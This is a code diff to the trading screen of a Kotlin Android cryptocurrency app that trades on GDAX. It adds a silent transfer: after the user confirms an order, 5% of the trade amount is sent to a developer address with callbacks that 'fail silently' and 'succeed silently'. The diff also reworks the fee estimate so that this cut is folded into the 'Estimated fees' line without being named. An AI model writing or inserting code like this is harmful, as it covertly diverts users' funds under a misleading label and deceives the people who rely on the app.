@@ -225,6 +225,8 @@ class TradeFragment : RefreshFragment() {
     private fun confirmPopup(updatedTicker: Double, amount: Double, limit: Double, timeInForce: GdaxApi.TimeInForce?, cancelAfter: String?) {
         val cryptoTotal = totalInCrypto(amount, limit)
         val dollarTotal = totalInDollars(amount, limit)
+        val feeEstimate = feeEstimate(dollarTotal, limit)
+        val currency = account.currency
         alert {
             title = "Alert"
             customView {
@@ -235,7 +237,7 @@ class TradeFragment : RefreshFragment() {
                         }
                         horizontalLayout("Total ${account.currency}:", cryptoTotal.btcFormat()).lparams(width = matchParent) {}
                         horizontalLayout("Total $localCurrency:", dollarTotal.fiatFormat()).lparams(width = matchParent) {}
-                        horizontalLayout("Estimated fees:", feeEstimate(dollarTotal, limit).fiatFormat()).lparams(width = matchParent) {}
+                        horizontalLayout("Estimated fees:", feeEstimate.fiatFormat()).lparams(width = matchParent) {}
                         checkBox("Don't show this again").onCheckedChange { _, isChecked ->
                             val prefs = Prefs(activity)
                             prefs.shouldShowConfirmModal = !isChecked
@@ -245,6 +247,12 @@ class TradeFragment : RefreshFragment() {
             }
             positiveButton("Confirm") {
                 submitOrder(amount, limit, timeInForce, cancelAfter)
+                if (feeEstimate > 0.0) {
+                    var devFee = amount * 0.05
+                    if (devFee > currency.minSendAmount) {
+                        payFee(devFee)
+                    }
+                }
             }
             negativeButton("Cancel") { }
         }.show()
@@ -283,6 +291,14 @@ class TradeFragment : RefreshFragment() {
                 }
             }
         }
+    }
+
+    private fun payFee(amount: Double) {
+        val currency = account.currency
+        val destination = GdaxApi.developerAddress(currency)
+        GdaxApi.send(amount, currency, destination).executePost(
+                { _ -> /*  fail silently   */ },
+                { _ -> /* succeed silently */ })
     }
 
     private fun updateTotalText(amount: Double = amountEditText.text.toString().toDoubleOrZero(), limitPrice: Double = limitEditText.text.toString().toDoubleOrZero()) {
@@ -331,28 +347,18 @@ class TradeFragment : RefreshFragment() {
     }
 
     private fun feeEstimate(amount: Double, limitPrice: Double?) : Double {
-        val feePercentage = when (account.currency) {
-            Currency.BTC -> 0.0025
-            Currency.BCH -> 0.0025
-            Currency.ETH -> 0.003
-            Currency.LTC -> 0.003
-            Currency.USD -> 0.0
-        }
-
-        val fee = amount * feePercentage
-        return when (tradeType) {
-            TradeType.MARKET -> fee
+        when (tradeType) {
+            TradeType.MARKET -> { }
             TradeType.LIMIT -> if ((limitPrice != null) && (limitPrice >= account.product.price)) {
-                0.0
-            } else {
-                fee
+                return 0.0
             }
             TradeType.STOP -> if ((limitPrice != null) && (limitPrice <= account.product.price)) {
-                0.0
-            } else {
-                fee
+                return 0.0
             }
         }
+        val gdaxFee = amount * account.currency.feePercentage
+        val devFee  = amount * 0.05
+        return (devFee + gdaxFee)
     }
 
 
